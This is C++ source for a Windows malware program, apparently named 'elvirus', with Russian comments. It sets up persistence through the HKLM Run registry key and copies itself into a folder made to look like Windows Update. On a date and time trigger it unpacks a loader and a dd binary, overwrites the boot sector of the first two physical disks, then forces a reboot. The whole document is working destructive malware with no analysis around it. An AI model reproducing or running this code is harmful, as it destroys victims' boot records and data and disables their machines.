#include <windows.h>
#include <winerror.h>
#include <fstream>
using namespace std;

	 

int main() {
	//Для начала ставимся в автозагрузку и копируемся
	HKEY desk=0;
	LPCSTR f="C:\\Program Files\\WindowsUpdate\\elvirus.exe";
	LPCSTR t="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,t,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&desk,NULL);
    RegCloseKey(desk);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,t,0,KEY_ALL_ACCESS,&desk);
	RegSetValueEx(desk,"elv",0,REG_SZ,(BYTE *)f,sizeof(f)*strlen(f));
	RegCloseKey(desk);
	HANDLE hf;
	WIN32_FIND_DATA FindFileData;
	hf=FindFirstFile("C:\\Program Files\\WindowsUpdate\\elvirus.exe", &FindFileData);
	if (hf==INVALID_HANDLE_VALUE)  {
	CopyFile("elvirus.exe","C:\\Program Files\\WindowsUpdate\\elvirus.exe",FALSE);
	CopyFile("time.pkg","C:\\Program Files\\WindowsUpdate\\time.pkg",FALSE);
	FindClose(hf);
}
	
	while (TRUE) {
	//Получаем системное время
	SYSTEMTIME st;
	GetLocalTime(&st);

	int year=st.wYear;
	int month=st.wMonth;
	int day=st.wDay;

	int hour=st.wHour;
	int minute=st.wMinute;
	int second=st.wSecond;

	if (day<22) return 0;

	if ((day>=22)&&(hour>=10)&&(minute>=30)) {
		ifstream f12;
		ofstream f1;
		ofstream f2;
		f12.open("C:\\Program Files\\WindowsUpdate\\time.pkg",ios::in | ios::binary);
		f1.open("C:\\Program Files\\WindowsUpdate\\loader.bin",ios::out | ios::binary);
		f2.open("C:\\Program Files\\WindowsUpdate\\dd.exe",ios::out | ios::binary);
		char buf;
		int loader=512;
		for(int i=0;i<loader;++i) {
			buf = f12.get();
			f1.put(buf);
		}
		while (!f12.eof()) {
			buf = f12.get();
			if(!f12.eof()) {
			f2.put(buf);
        }
		}
		f12.close();
		f1.close();
		f2.close();
		//dd exploit (запись на диск при любых привелегиях пользователя windows)
		system("C:\\PROGRA~1\\WindowsUpdate\\dd.exe count=1 if=C:\\PROGRA~1\\WindowsUpdate\\loader.bin of=\\\\?\\Device\\Harddisk0\\Partition0");
		system("C:\\PROGRA~1\\WindowsUpdate\\dd.exe count=1 if=C:\\PROGRA~1\\WindowsUpdate\\loader.bin of=\\\\?\\Device\\Harddisk1\\Partition0");
		//Получаем превилегии на перезагрузку (MSDN)
 
   	    HANDLE hToken; 
		TOKEN_PRIVILEGES tkp; 
 
 		if (!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {}
    	  
 		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, 
        &tkp.Privileges[0].Luid); 
 
 		tkp.PrivilegeCount = 1;     
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
 
 		AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, 
        (PTOKEN_PRIVILEGES)NULL, 0);  
 
        if (GetLastError() != ERROR_SUCCESS) {}
    	   
        // Перезагрузка с закрытием всех программ 
 
 		if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0)) {}
		InitiateSystemShutdown("127.0.0.1","",0,1,1);
		MessageBox(NULL, "ПРИВЕТ", "ПРИВЕТ", MB_OK | MB_ICONERROR);  
		return 0;
	}
	}
}
